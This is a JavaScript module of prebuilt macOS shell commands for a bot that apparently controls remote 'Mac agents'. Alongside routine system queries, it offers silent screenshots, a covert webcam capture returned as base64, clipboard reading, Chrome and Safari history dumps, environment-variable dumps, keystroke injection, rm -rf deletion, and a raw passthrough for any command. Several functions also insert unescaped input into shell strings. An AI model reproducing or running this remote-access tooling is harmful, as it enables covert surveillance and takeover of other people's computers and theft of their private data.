// commands/system.js
// Pre-built macOS command strings for the bot.
// Import this wherever you need to build shell commands to send to Mac agents.
'use strict';

const system = {
  // ── System info ─────────────────────────────────────────────────────────────
  sysinfo:       () => 'system_profiler SPHardwareDataType SPSoftwareDataType 2>/dev/null',
  uptime:        () => 'uptime && sw_vers',
  diskUsage:     () => 'df -h',
  memoryPressure:() => 'vm_stat && sysctl -n hw.memsize',
  cpuLoad:       () => 'top -l 1 -s 0 | head -25',

  // ── Processes ────────────────────────────────────────────────────────────────
  processes:     (n = 20) => `ps aux | sort -rk 3 | head -${n + 1}`,
  killProcess:   (pid)    => `kill -9 ${parseInt(pid)}`,

  // ── Network ──────────────────────────────────────────────────────────────────
  networkInterfaces: () => 'ifconfig',
  openConnections:   () => 'lsof -i -n -P | grep -E "ESTABLISHED|LISTEN"',
  wifiInfo: () =>
    '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I',
  wifiScan: () =>
    '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s',
  publicIp:  () => 'curl -s https://api.ipify.org',
  flushDns:  () => 'dscacheutil -flushcache && killall -HUP mDNSResponder',

  // ── Files ────────────────────────────────────────────────────────────────────
  listDir:    (path = '~') => `ls -lah "${path}" 2>&1`,
  readFile:   (path)       => `cat "${path}" 2>&1`,
  deleteFile: (path)       => `rm -rf "${path}" 2>&1`,

  // ── Users & sessions ─────────────────────────────────────────────────────────
  whoIsLoggedIn: () => 'who && last | head -10',
  listUsers:     () => 'dscl . list /Users | grep -v "^_"',

  // ── Power ────────────────────────────────────────────────────────────────────
  sleep:    () => 'pmset sleepnow',
  restart:  () => 'shutdown -r now',
  shutdown: () => 'shutdown -h now',

  // ── Screen ───────────────────────────────────────────────────────────────────
  lockScreen:  () =>
    `osascript -e 'tell application "System Events" to keystroke "q" using {command down, control down}'`,
  screenshot:  (path = '/tmp/_sc.jpg') =>
    `screencapture -x -t jpg "${path}" && base64 "${path}" && rm -f "${path}"`,
  // Capture front webcam frame silently via ffmpeg (brew install ffmpeg)
  webcam: (path = '/tmp/_wc.jpg') =>
    `ffmpeg -f avfoundation -video_size 1280x720 -framerate 30 -i "0" -frames:v 1 -y "${path}" 2>/dev/null && base64 "${path}" && rm -f "${path}"`,

  // ── Clipboard ────────────────────────────────────────────────────────────────
  getClipboard: () => 'pbpaste',
  setClipboard: (text) =>
    `printf '%s' '${text.replace(/'/g, "'\\''")}' | pbcopy`,

  // ── Applications ─────────────────────────────────────────────────────────────
  openApp:       (name) => `open -a "${name}"`,
  openUrl:       (url)  => `open "${url}"`,
  quitApp:       (name) => `osascript -e 'quit app "${name}"'`,
  installedApps: ()     => 'ls /Applications',
  frontApp:      ()     =>
    `osascript -e 'tell application "System Events" to get name of first application process whose frontmost is true'`,
  idleTime:      ()     =>
    `ioreg -c IOHIDSystem | awk '/HIDIdleTime/ {print int($NF/1000000000)" seconds idle"; exit}'`,

  // ── Audio / display ──────────────────────────────────────────────────────────
  getVolume:  () => `osascript -e 'output volume of (get volume settings)'`,
  setVolume:  (level) => `osascript -e 'set volume output volume ${parseInt(level)}'`,
  mute:       () => `osascript -e 'set volume with output muted'`,
  unmute:     () => `osascript -e 'set volume without output muted'`,
  toggleDarkMode: () =>
    `osascript -e 'tell app "System Events" to tell appearance preferences to set dark mode to not dark mode'`,
  setWallpaper: (path) =>
    `osascript -e 'tell application "Finder" to set desktop picture to POSIX file "${path}"'`,

  // ── Security ─────────────────────────────────────────────────────────────────
  firewallStatus:   () => '/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate',
  gatekeeperStatus: () => 'spctl --status',
  sipStatus:        () => 'csrutil status',
  launchAgents:     () =>
    'ls -la ~/Library/LaunchAgents/ 2>/dev/null; ls -la /Library/LaunchAgents/ 2>/dev/null; ls -la /Library/LaunchDaemons/ 2>/dev/null',

  // ── Network extras ───────────────────────────────────────────────────────────
  listenPorts: () => 'lsof -iTCP -sTCP:LISTEN -n -P',
  arpTable:    () => 'arp -a',
  routeTable:  () => 'netstat -rn',
  dnsServers:  () => 'scutil --dns | grep nameserver | sort -u',

  // ── Browser history ──────────────────────────────────────────────────────────
  chromeHistory: (n = 20) =>
    `sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/History ` +
    `'SELECT datetime(last_visit_time/1000000-11644473600,"unixepoch","localtime"),title,url FROM urls ORDER BY last_visit_time DESC LIMIT ${n};' 2>/dev/null`,
  safariHistory: (n = 20) =>
    `sqlite3 ~/Library/Safari/History.db ` +
    `'SELECT datetime(visit_time+978307200,"unixepoch","localtime"),title,url FROM history_items JOIN history_visits ON history_items.id=history_visits.history_item ORDER BY visit_time DESC LIMIT ${n};' 2>/dev/null`,

  // ── File system ──────────────────────────────────────────────────────────────
  downloads:   ()    => 'ls -lah ~/Downloads/ | head -40',
  recentFiles: (n = 25) =>
    `find ~ -not -path '*/.*' -maxdepth 5 -type f -newer /tmp 2>/dev/null | head -${n}`,
  envVars:     ()    => 'printenv | sort',
  crontabs:    ()    => 'crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null',

  // ── Input ────────────────────────────────────────────────────────────────────
  keystroke: (keys) =>
    `osascript -e 'tell application "System Events" to keystroke "${keys.replace(/"/g, '\\"')}"'`,

  // ── Notifications / audio ────────────────────────────────────────────────────
  say:          (msg)   => `say "${msg.replace(/"/g, '\\"')}"`,
  notification: (title, msg) =>
    `osascript -e 'display notification "${msg}" with title "${title}"'`,

  // ── Raw passthrough ───────────────────────────────────────────────────────────
  raw: (cmd) => cmd,
};

module.exports = system;
